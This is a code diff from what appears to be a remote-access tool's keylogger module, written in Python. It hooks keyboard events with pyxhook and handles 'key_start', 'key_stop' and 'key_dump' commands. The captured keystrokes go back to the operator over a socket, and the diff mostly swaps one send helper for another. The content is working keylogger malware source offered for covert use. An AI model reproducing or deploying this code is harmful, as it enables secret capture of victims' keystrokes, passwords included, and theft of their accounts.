@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -38,14 +37,14 @@ def key(option):
     global keylog
     if option == 'key_start':
         if active_logger:
-            main_send('[-]Keylogger already started', s)
+            send_all(s,'[-]Keylogger already started')
         else:
             hooks_manager = pyxhook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
             hooks_manager.start()
             active_logger = not active_logger
-            main_send('[+]Activated keylogger', s)
+            send_all(s,'[+]Activated keylogger')
             while True:
                 if not active_logger:
                     hooks_manager.cancel()
@@ -54,12 +53,12 @@ def key(option):
                     sleep(1)
     elif option == 'key_stop':
         if not active_logger:
-            main_send('[-]Keylogger not started', s)
+            send_all(s,'[-]Keylogger not started')
         else:
             active_logger = not active_logger
-            main_send('[+]Stopped keylogger', s)
+            send_all(s,'[+]Stopped keylogger')
     elif option == 'key_dump':
-        main_send('[+]Keylog dump : \\n' + keylog + '\\n', s)
+        send_all(s,'[+]Keylog dump : \\n' + keylog + '\\n')
         keylog = ""''')
         config.logics.append('''
             elif command in ('key_start','key_stop','key_dump'):
